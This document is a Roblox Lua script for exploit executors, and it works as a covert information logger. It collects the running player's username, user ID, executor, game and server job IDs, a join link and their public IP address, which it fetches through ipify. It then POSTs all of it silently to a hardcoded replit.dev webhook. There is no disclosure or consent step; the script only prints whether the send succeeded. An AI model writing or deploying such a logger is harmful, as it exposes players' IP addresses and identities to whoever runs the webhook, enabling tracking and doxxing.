local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "https://099ba264-091c-4240-862f-929a2d4cf6dc-00-tnnjm7ohtx9b.kirk.replit.dev/"  -- Your webhook URL (Delta-compatible)

local player = Players.LocalPlayer
local username = player.Name
local userId = tostring(player.UserId)
local placeId = game.PlaceId
local jobId = game.JobId
local executor = identifyexecutor and identifyexecutor() or "Unknown"
local ipAddress = "Unavailable"

-- Try to fetch IP
local function fetchIP()
    local request = http_request or request or syn and syn.request or http and http.request
    if request then
        local success, response = pcall(function()
            return request({
                Url = "https://api.ipify.org?format=json",
                Method = "GET"
            })
        end)
        if success and response and response.Body then
            local decoded = HttpService:JSONDecode(response.Body)
            if decoded and decoded.ip then
                ipAddress = decoded.ip
            end
        end
    end
end

pcall(fetchIP)

-- Game name
local gameName = "Unknown Game"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(placeId).Name
end)

-- Payload to send to the Replit server
local payload = {
    username = username,
    userId = userId,
    executor = executor,
    ipAddress = ipAddress,
    gameName = gameName,
    placeId = tostring(placeId),
    jobId = jobId,
    joinLink = string.format("https://www.roblox.com/games/%d?jobId=%s", placeId, jobId),
}

local request = http_request or request or syn and syn.request or http and http.request
if request then
    local success, response = pcall(function()
        return request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Body = HttpService:JSONEncode(payload),
            Headers = {
                ["Content-Type"] = "application/json"
            }
        })
    end)
    
    if success then
        print("Data sent successfully to Replit!")
    else
        print("Error sending data: " .. tostring(response))
    end
end
